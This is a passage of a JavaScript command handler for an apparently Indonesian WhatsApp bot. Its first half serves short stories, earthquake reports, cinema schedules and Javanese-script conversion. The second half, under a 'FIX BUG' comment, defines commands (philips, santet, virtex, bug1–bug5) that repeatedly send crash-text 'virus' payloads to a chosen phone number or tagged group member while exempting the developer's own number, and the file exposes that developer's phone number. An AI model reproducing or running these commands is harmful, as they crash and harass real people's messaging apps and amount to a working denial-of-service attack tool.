      case 'cerpen-malaysia': {

        let cerpe = await cerpen(`malaysia`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-mengharukan': {

        let cerpe = await cerpen(`mengharukan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-misteri': {

        let cerpe = await cerpen(`misteri`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-motivasi': {

        let cerpe = await cerpen(`motivasi`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-nasihat': {

        let cerpe = await cerpen(`nasihat`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-nasionalisme': {

        let cerpe = await cerpen(`nasionalisme`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-olahraga': {

        let cerpe = await cerpen(`olahraga`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-patahhati': {

        let cerpe = await cerpen(`patah hati`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-penantian': {

        let cerpe = await cerpen(`penantian`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-pendidikan': {

        let cerpe = await cerpen(`pendidikan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-pengalaman': {

        let cerpe = await cerpen(`pengalaman pribadi`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-pengorbanan': {

        let cerpe = await cerpen(`pengorbanan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-penyesalan': {

        let cerpe = await cerpen(`penyesalan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-perjuangan': {

        let cerpe = await cerpen(`perjuangan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-perpisahan': {

        let cerpe = await cerpen(`perpisahan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-persahabatan': {

        let cerpe = await cerpen(`persahabatan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-petualangan': {

        let cerpe = await cerpen(`petualangan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-ramadhan': {

        let cerpe = await cerpen(`ramadhan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-remaja': {

        let cerpe = await cerpen(`remaja`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-rindu': {

        let cerpe = await cerpen(`rindu`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-rohani': {

        let cerpe = await cerpen(`rohani`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-romantis': {

        let cerpe = await cerpen(`romantis`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-sastra': {

        let cerpe = await cerpen(`sastra`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-sedih': {

        let cerpe = await cerpen(`sedih`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-sejarah': {

        let cerpe = await cerpen(`sejarah`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'jadibot': {
        if (isGroup) return reply('Gunakan bot di privat chat')
        jadibot(conn, msg, from)
      }
        break
      case 'listjadibot':
        try {
          let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
          te = "*List Jadibot*\n\n"
          for (let i of user) {
            let y = await conn.decodeJid(i.id)
            te += " × User : @" + y.split("@")[0] + "\n"
            te += " × Name : " + i.name + "\n\n"
          }
          conn.sendMessage(from, { text: te, mentions: [y], }, { quoted: msg })
        } catch (err) {
          reply(`Belum Ada User Yang Jadibot`)
        }
        break
      case 'gempa':
        let gempaaa = await gempa()
        let gempanyy = '*INFO GEMPA*\n'
        for (let i of gempaaa) {
          gempanyy += `Tanggal : ${i.date}\nKordinat : ${i.locate}\nMagnitude :${i.magnitude}\nLokasi ${i.location}\nDaerah bahaya :${i.warning}\n\n`
        }
        reply(gempanyy)
        break
      case 'gempanow': {
        let gemp = await gempaNow()
        let texih = 'GEMPA-NOW\n\n'
        for (let i of gemp) {
          texih += `Tanggal : ${i.date}
latitude : ${i.latitude} 
longitude : ${i.longitude} 
Magnitude :${i.magnitude}
Lokasi ${i.location}
Kedalaman :${i.depth}\n\n`
        }
        reply(texih)
      }
        break
      case 'bioskopnow': {
        let skop = await bioskopNow()
        let storee = '❉─────────────────────❉\n'
        for (let i of skop) {
          storee += `\n*「 *JADWAL BIOSKOP NOW* 」*\n
- *Judul* : ${i.title}
- *Link* : ${i.url}\n
- *Genre* : ${i.genre}
- *Durasi* : ${i.duration}
- *Tayang di* : ${i.playingAt}\n❉─────────────────────❉`
          reply(storee)
        }
      }
        break
      case 'latintoaksara': {
        if (!q) return reply(`Contoh : #${command} Makan bang`)
        let uios = await latinToAksara(q)
        reply(uios)
      }
        break
      case 'aksaratolatin': {
        if (!q) return reply(`Contoh : #${command} ꦪꦺꦴꦲꦺꦴ`)
        let uios = await aksaraToLatin(q)
        reply(uios)
      }
        break

      // FIX BUG
      case 'sendbug':
      case 'philips': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '0@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('Itu Nomor Lu Sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim philips to @${num.split('@')[0]}`, [num])
      }
        break
      case 'philips2': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('Itu Nomor Lu Sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'philips3': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('Itu Nomor Lu Sendiri')
        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'santet': {
        if (!isGroup) return reply(mess.OnlyGrup)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else {
          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
        }
      }
        break
      case 'santet2': {
        if (!isGroup) return reply(mess.OnlyGrup)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else {
          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
        }
      }
        break
      case 'santet3': {
        if (!isGroup) return reply(mess.OnlyGrup)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          await sleep(3000)
          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
        } else {
          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
        }
      }
        break
      case 'virtex': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'virtex2': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'virtex3': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug1': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug2': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug3': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug4': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break
      case 'bug5': {
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
        var num = q + "@s.whatsapp.net"
        var dev = '6283834558105@s.whatsapp.net'
        if (num == dev) return reply('Itu developer gua')
        if (num == sender) return reply('itu nomor lu sendiri')
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
        await sleep(3000)
        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
        await sleep(3000)
        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
      }
        break

      default:

    }
  } catch (err) {
    console.log(color('[ERROR]', 'red'), err)
    server_eror.push({ "error": `${err}` })
    fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
  }
}